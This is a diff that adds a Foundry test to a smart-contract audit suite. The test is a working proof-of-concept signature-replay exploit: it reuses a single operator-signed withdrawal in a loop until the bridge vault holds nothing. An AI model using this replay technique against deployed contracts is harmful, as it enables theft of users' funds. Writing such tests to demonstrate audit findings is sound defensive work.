@@ -296,4 +296,54 @@ contract L1BossBridgeTest is Test {
         emit Deposit(address(vault), attacker, valueBalance);
         tokenBridge.depositTokensToL2(address(vault), attacker, valueBalance);
     }
+
+    function testSignatureReplay() public {
+        uint256 vaultInitialBalance = 1000 ether;
+        uint256 attackerInitialBalance = 100 ether;
+        address attacker = makeAddr("attacker");
+        deal(address(token), address(vault), vaultInitialBalance);
+        deal(address(token), address(attacker), attackerInitialBalance);
+
+        // attacker deposits
+        vm.startPrank(attacker);
+        token.approve(address(tokenBridge), type(uint256).max);
+        tokenBridge.depositTokensToL2(
+            attacker,
+            attacker,
+            attackerInitialBalance
+        );
+        vm.stopPrank();
+
+        // signer signs the withdrawal
+        bytes memory message = abi.encode(
+            address(token),
+            0,
+            abi.encodeCall(
+                IERC20.transferFrom,
+                (address(vault), attacker, attackerInitialBalance)
+            )
+        );
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(
+            operator.key,
+            MessageHashUtils.toEthSignedMessageHash(
+                keccak256(abi.encodePacked(message))
+            )
+        );
+
+        while (token.balanceOf(address(vault)) > 0) {
+            tokenBridge.withdrawTokensToL1(
+                attacker,
+                attackerInitialBalance,
+                v,
+                r,
+                s
+            );
+        }
+
+        assertEq(token.balanceOf(address(vault)), 0);
+        assertEq(
+            token.balanceOf(address(attacker)),
+            vaultInitialBalance + attackerInitialBalance
+        );
+    }
 }
